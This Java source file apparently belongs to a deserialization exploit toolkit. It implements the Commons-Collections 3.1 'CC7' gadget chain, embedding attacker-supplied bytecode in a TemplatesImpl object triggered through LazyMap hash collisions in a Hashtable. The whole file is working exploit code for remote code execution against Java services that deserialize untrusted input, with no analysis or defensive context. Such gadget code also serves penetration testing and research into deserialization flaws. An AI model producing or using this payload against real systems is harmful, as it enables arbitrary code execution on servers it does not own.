package com.bcvgh.core.unser.gadgets.bytecode;

import com.bcvgh.core.unser.core.pojo.UnSerInput;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.bcvgh.core.unser.annotation.DependenciesVersion;
import com.bcvgh.core.unser.annotation.RequireParameter;
import com.bcvgh.core.unser.gadgets.ObjectPayload;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

import static com.bcvgh.core.unser.gadgets.util.Reflections.setFieldValue;

@DependenciesVersion("Commons-collections-3.1")
@RequireParameter("ResourcePath")
public class CC7 implements ObjectPayload {
    @Override
    public <T> Object getObject(UnSerInput unSerInput) throws Exception {
        TemplatesImpl obj=new TemplatesImpl();
        setFieldValue(obj,"_bytecodes",new byte[][]{unSerInput.getBytecode()});
        setFieldValue(obj,"_name","HelloT");
        setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());
        Transformer[] fakeTransformers = new Transformer[] {new
                ConstantTransformer(2)};
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(obj),
                new InvokerTransformer("newTransformer", null, null)
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
        Map innerMap1 = new HashMap();
        innerMap1.put("xO",1);
        Map innerMap2 = new HashMap();
        innerMap2.put("y0",1);

        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);

        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1,1);
        hashtable.put(lazyMap2,2);
        lazyMap2.remove("xO");

        Class clazz = ChainedTransformer.class;
        setFieldValue(transformerChain,"iTransformers",transformers);
//        Field field = clazz.getDeclaredField("iTransformers");
//        field.setAccessible(true);
//        field.set(transformerChain,transformers);
        return hashtable;
    }
}
